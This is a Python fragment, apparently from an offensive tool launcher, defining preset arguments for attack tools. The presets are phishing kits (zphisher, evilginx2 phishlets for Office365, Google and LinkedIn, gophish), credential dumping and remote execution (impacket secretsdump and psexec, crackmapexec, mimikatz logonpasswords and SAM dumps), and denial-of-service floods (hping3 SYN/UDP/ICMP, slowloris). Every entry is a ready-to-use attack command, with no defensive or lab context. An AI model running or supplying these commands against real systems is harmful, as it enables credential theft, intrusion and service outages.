BUILTIN_ARGS = {
    "zphisher": [
        ("-p -t -o", "Interactive mode"),
        ("--ngrok", "Ngrok tunnel"),
        ("--cloudflared", "Cloudflare tunnel"),
    ],
    "evilginx2": [
        ("-p o365 -t target.com", "Office365 phishlet"),
        ("-p google -t target.com", "Google phishlet"),
        ("-p linkedin -t target.com", "LinkedIn phishlet"),
    ],
    "gophish": [
        ("--port 3333", "Start on port 3333"),
        ("--config config.json", "With config"),
    ],
    "impacket": [
        ("psexec.py domain/user:pass@target", "PSExec"),
        ("wmiexec.py domain/user:pass@target", "WMIExec"),
        ("secretsdump.py domain/user:pass@target", "Dump secrets"),
    ],
    "crackmapexec": [
        ("smb target -u user -p pass", "SMB check"),
        ("smb 192.168.1.0/24 -u user -p pass --shares", "Network shares"),
        ("winrm target -u user -p pass -x whoami", "WinRM exec"),
    ],
    "mimikatz": [
        ("privilege::debug sekurlsa::logonpasswords", "Dump passwords"),
        ("lsadump::sam", "Dump SAM"),
        ("token::elevate", "Elevate token"),
    ],
    "hping3": [
        ("-S target.com -p 80 --flood", "SYN flood"),
        ("--udp target.com -p 53 --flood", "UDP flood"),
        ("-1 target.com --flood", "ICMP flood"),
    ],
    "slowloris": [
        ("-p 80 target.com", "HTTP slow"),
        ("-p 443 --https target.com", "HTTPS slow"),
        ("-s 500 target.com", "500 sockets"),
    ],
}
